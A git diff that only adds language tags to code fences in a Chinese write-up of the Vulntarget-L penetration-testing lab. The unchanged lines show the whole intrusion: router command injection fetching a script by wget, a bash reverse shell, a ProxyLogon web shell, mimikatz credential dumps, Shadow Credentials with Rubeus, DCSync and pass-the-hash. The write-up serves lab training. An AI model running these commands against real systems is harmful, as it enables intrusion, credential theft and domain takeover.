@@ -18,7 +18,7 @@ date: "2023-09-06"
 ## 靶场搭建
 这个靶场或多或少还是有一点问题的，我们跟着文档来进行还原，首先对于外网路由器，该路由器有两个页面，一个腾达，一个TOTOLINK，如果外网NAT和作者配置的同一网段，估计不需要更改，我使用的自己的NAT网段，首先将路由器恢复快照，然后输入
 
-```
+```shell
 sudo iptables -t nat -A PREROUTING  -p tcp -d 192.168.36.172 --dport 60080 -j DNAT --to-destination 192.168.6.11:80
 sudo iptables -t nat -A POSTROUTING -p tcp -s 192.168.6.11 --sport 80 -j SNAT --to-source 192.168.36.172
 sudo iptables-save
@@ -30,7 +30,7 @@ sudo iptables-save
 
 内网跟着配置同网段即可，途中遇到一次此工作站和主域间的信任关系失败，进入Exchange服务器的Powershell中输入下面的命令，然后输入密码，重启即可。
 
-```
+```shell
 Reset-ComputerMachinePassword -Server “DC” -Credential vulntarget\Administrator
 ```
 
@@ -42,7 +42,7 @@ Reset-ComputerMachinePassword -Server “DC” -Credential vulntarget\Administra
 
 #### 外网打点-探测目标IP
 
-```
+```bash
 # nmap -sP 192.168.36.1/24
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 13:21 中国标准时间
 Nmap scan report for 192.168.36.1
@@ -58,7 +58,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 16.30 seconds
 
 #### 外网打点-全端口扫描
 
-```
+```bash
 # nmap -p- -A --min-rate 1000 192.168.36.172
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-05 13:57 中国标准时间
 NSOCK ERROR [0.2780s] ssl_init_helper(): OpenSSL legacy provider failed to load.
@@ -115,7 +115,7 @@ http://192.168.36.172:60080/goform/setUsbUnload/?deviceName=;%20wget%20http://hg
 
 exp利用脚本如下：
 
-```
+```python
 from pwn import *
 import requests
 
@@ -158,8 +158,8 @@ else:
 
 ```
 Kali启动一个Web服务，让受害机主动下载攻击机上的1.sh并执行，1.sh内容如下
-```
 
+```bash
 #!/bin/bash
 bash -i >& /dev/tcp/192.168.36.131/2333 0>&1
 ```
@@ -168,15 +168,16 @@ bash -i >& /dev/tcp/192.168.36.131/2333 0>&1
 
 #### 写入ssh公钥
 
-```
+```shell
 mkdir /root/.ssh/
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCp0sxPQZ6brijhvWNbKdApNNSvzVHV3U29lEfgAMLO6x9bEcDQvrsUOWWDuT9HYr7HNTmV6cq2lXmDJ4xxpckkPZ5/4wby09k5uKk6tl5RU/eiaTH+57tPOuVZ6Kcy7mRY33G/rRPfZ63TiQDTwz6Z4pLJfiaUihWf/URQevhp8KAfNGPJGyI6PmXv/YFqU8QRZvW3w+JZiKYHvnnQBeBRtc3Q0CTzsquYGC5TALBLumsQuLCvb9v7h9RyncF+J3NfPqrnUFUZ06lfLsuc7XQZWysTo2AQpWa5suOp+QoJCBUeHNrJEUu4fMKeGIaGk8qqlrdWmPcchtRc5/F/z+VQ6xEkyTwN/wgjsucpTjyiXE9m3nDEgZOweOEN5H7YMi1uaYbLrV7WqwcEUp9eZwgv1F5hGWfr13sQHFMWiCqir29hX8SGuCCIa1xG/kDtimLbKM3u4PZf7lGZU1VtA1UAfuD37evIhwHZAqNodFvtSf+4tCcxdkEdn0CKm29IiiM= me@DESKTOP-431ILFL" >> ~/.ssh/authorized_keys
 cat /root/.ssh/authorized_keys
 ```
+
 ![image.png](../../images/Vulntarget-L-6.png)
 发现这个服务器没有ssh，直接给它下一个
 
-```
+```shell
 sudo apt-get update
 sudo apt-get install openssh-server
 ```
@@ -189,7 +190,7 @@ sudo apt-get install openssh-server
 
 #### 内网渗透-172.18.10.100/24探测
 
-```
+```shell
 root@router:/tmp# ./fscan -h 172.18.10.100/24
 
    ___                              _    
@@ -249,7 +250,7 @@ start vulscan
 
 ```
 
-```
+```shell
 root@router:/tmp/nacs_linux_amd64# ./nacs -h 172.18.10.1/24
  _  _     ___     ___     ___   
 | \| |   /   \   / __|   / __|  
@@ -350,7 +351,7 @@ DNS tree name         : vulntarget.com
 
 #### 内网渗透-ProxyLogon
 
-```
+```shell
 ➜  exprolog-main proxychains4 -q python3 exprolog.py -t 172.18.10.102 -e administrator@vulntarget.com
     ______     ____             __           
    / ____/  __/ __ \_________  / /___  ____ _
@@ -384,7 +385,7 @@ curl --request POST --url https://172.18.10.102/owa/auth/psck5.aspx --header 'Co
 
 ```
 
-```
+```shell
 ➜  exprolog-main proxychains4 -q curl --request POST --url https://172.18.10.102/owa/auth/psck5.aspx --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -k
 
 用户信息
@@ -474,7 +475,7 @@ IsValid                         : True
 
 发现直接是System权限，新建管理员用户直接上线，这里卡了好久，一直换着方式想开启3389，powershell的方式是有问题的，最后使用交互式的shell解决的，注意关闭鉴权。
 
-```
+```shell
 ➜  exprolog-main proxychains4 -q python3 exprolog.py -t 172.18.10.102 -e administrator@vulntarget.com -i true  
     ______     ____             __           
    / ____/  __/ __ \_________  / /___  ____ _
@@ -525,7 +526,7 @@ instance of __PARAMETERS
 
 #### 内网渗透-收集账号密码
 
-```
+```shell
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 27256172 (00000000:019fe56c)
@@ -919,7 +920,7 @@ SID               : S-1-5-90-0-1
 
 获取域内关系
 
-```
+```shell
 ➜  BloodHound.py-master proxychains4 -q python3 bloodhound.py -u "EXCHANGE$" --hashes fc35b10255a4c517f6eeed9ea3c74729:fc35b10255a4c517f6eeed9ea3c74729 -d vulntarget.com -dc DC.vulntarget.com -c all --dns-tcp -ns 172.18.10.101 --auth-method ntlm --zip
 INFO: Found AD domain: vulntarget.com
 INFO: Connecting to LDAP server: DC.vulntarget.com
@@ -959,7 +960,7 @@ INFO: Compressing output into 20230905084456_bloodhound.zip
 
 将域用户ex_mail添加至`ENTERPRISE KEY ADMINS`组内，此处需使用SYSTEM权限添加
 
-```
+```shell
 # 使用ADFind.exe查询ex_mail用户的distinguishedName
 adfind.exe -b "dc=VULNTARGET,dc=COM" -f "(&(objectCategory=person)(objectClass=user)(sAMAccountName=ex_mail))" distinguishedName
 
@@ -977,7 +978,7 @@ net group "ENTERPRISE KEY ADMINS" /domain
 ![image.png](../../images/Vulntarget-L-13.png)
 通过 Whisker 的 add命令向域控制器的 msDS-KeyCredentialLink属性添加 Shadow Credentials，此处需要使用管理员身份打开CMD。
 
-```
+```shell
 C:\Users\ex_mail\Desktop>Whisker.exe add /target:DC$ /domain:vulntarget.com /dc:DC.vulntarget.com
 [*] No path was provided. The certificate will be printed as a Base64 blob
 [*] No pass was provided. The certificate will be stored with the password wjqlMpIql3oojLvS
@@ -994,7 +995,7 @@ C:\Users\ex_mail\Desktop>Whisker.exe add /target:DC$ /domain:vulntarget.com /dc:
 Rubeus.exe asktgt /user:DC$ /certificate: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 /password:"wjqlMpIql3oojLvS" /domain:vulntarget.com /dc:DC.vulntarget.com /getcredentials /show
 ```
 
-```
+```bash
 C:\Users\ex_mail\Desktop>Whisker.exe list /target:DC$ /domain:vulntarget.com /dc:DC.vulntarget.com
 [*] Searching for the target account
 [*] Target user found: CN=DC,OU=Domain Controllers,DC=vulntarget,DC=com
@@ -1004,7 +1005,7 @@ C:\Users\ex_mail\Desktop>Whisker.exe list /target:DC$ /domain:vulntarget.com /dc
 
 在Whisker.exe给出的命令可以使用基于证书的身份验证请求 TGT 票据，在最后加上/ptt，将凭证传入内存中
 
-```
+```bash
 C:\Users\ex_mail\Desktop>Rubeus.exe asktgt /user:DC$ /certificate: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 /password:"wjqlMpIql3oojLvS" /domain:vulntarget.com /dc:DC.vulntarget.com /getcredentials /show /ptt
 
    ______        _
@@ -1077,7 +1078,7 @@ C:\Users\ex_mail\Desktop>Rubeus.exe asktgt /user:DC$ /certificate:MIIJbgIBAzCCCS
 
 klist查看凭证
 
-```
+```bash
 C:\Users\ex_mail\Desktop>klist
 
 当前登录 ID 是 0:0x1ac171
@@ -1095,8 +1096,10 @@ C:\Users\ex_mail\Desktop>klist
         缓存标志: 0x1 -> PRIMARY
         调用的 KDC:
 ```
+
 DCsync
-```
+
+```bash
 C:\Users\ex_mail\Desktop\x64>mimikatz.exe "lsadump::dcsync /domain:vulntarget.com /user:vulntarget\Administrator" exit
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
@@ -1190,7 +1193,7 @@ Bye!
 
 #### 内网渗透-导出所有用户hash
 
-```
+```shell
 C:\Users\ex_mail\Desktop\x64>mimikatz.exe "lsadump::dcsync /domain:vulntarget.com /all /csv" exit
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
@@ -1230,7 +1233,7 @@ Bye!
 
 # 内网渗透-域控
 
-```
+```shell
 proxychains4 -q python3 psexec.py vulntarget.com/Administrator@172.18.10.101 -hashes :570a9a65db8fba761c1008a51d4c95ab -codec gbk
 ```
 
